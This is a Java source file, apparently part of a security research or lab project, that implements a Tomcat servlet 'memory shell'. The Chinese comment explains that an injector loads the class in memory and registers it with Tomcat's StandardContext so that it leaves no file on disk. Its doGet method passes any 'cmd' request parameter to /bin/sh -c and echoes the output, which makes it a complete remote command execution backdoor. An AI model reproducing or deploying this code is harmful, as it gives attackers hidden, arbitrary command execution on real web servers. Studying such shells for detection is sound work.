package evil;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Scanner;

/**
 * 最普通的 servlet 内存马。
 *
 * 这个类不会进入测试应用的 classpath，也不会出现在部署目录里；
 * 注入器从 payloads/target/classes 读出 .class 字节，用自定义 ClassLoader
 * 在内存中 define，再注册到 Tomcat 的 StandardContext。
 *
 * 访问 /shell?cmd=<command> 执行命令并回显。
 */
public class EvilServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        if (cmd == null || cmd.isEmpty()) {
            response.sendError(HttpServletResponse.SC_BAD_REQUEST, "missing cmd");
            return;
        }

        Process process = new ProcessBuilder("/bin/sh", "-c", cmd)
                .redirectErrorStream(true)
                .start();
        Scanner scanner = new Scanner(process.getInputStream(), "UTF-8").useDelimiter("\\A");
        String output = scanner.hasNext() ? scanner.next() : "";

        response.setContentType("text/plain;charset=UTF-8");
        response.getWriter().write(output);
    }
}
